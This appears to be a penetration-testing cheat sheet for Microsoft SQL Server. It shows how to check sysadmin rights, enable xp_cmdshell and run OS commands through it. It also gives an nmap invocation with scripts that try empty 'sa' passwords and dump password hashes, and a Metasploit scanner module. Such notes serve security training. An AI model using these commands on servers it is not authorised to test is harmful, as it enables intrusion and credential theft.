# Microsoft SQL Server

Default port: 1433

## Resources
- <https://book.hacktricks.xyz/network-services-pentesting/pentesting-mssql-microsoft-sql-server>
- <https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet>

## Commands

help


### check what is the role we have in the server
`SELECT is_srvrolemember('sysadmin');`


What extended stored procedure of Microsoft SQL Server can be used in order to spawn a Windows command shell?
`xp_cmdshell`

Check if the xp_cmdshell is already activated by issuing the first command:
`EXEC xp_cmdshell 'net user'`
`EXEC xp_cmdshell 'whoami'`


If xp_cmdshell is not activated (turned off) we will need to proceed with the activation as follows:
```
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
sp_configure; -- Enabling the sp_configure as stated in the above error message
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE
```

On MSSQL 2005 you may need to reactivate xp_cmdshell first as it’s disabled by default:

```
EXEC xp_cmdshell 'net user';
EXEC sp_configure 'show advanced options', 1;
RECONFIGURE;
EXEC sp_configure 'xp_cmdshell', 1;
RECONFIGURE;
```





## Tools

### nmap
```
nmap --script ms-sql-info,ms-sql-empty-password,ms-sql-xp-cmdshell,ms-sql-config,ms-sql-ntlm-info,ms-sql-tables,ms-sql-hasdbaccess,ms-sql-dac,ms-sql-dump-hashes --script-args mssql.instance-port=1433,mssql.username=sa,mssql.password=,mssql.instance-name=MSSQLSERVER -sV -p 1433 <IP>
```


### Metasploit
```
msf> use auxiliary/scanner/mssql/mssql_ping
```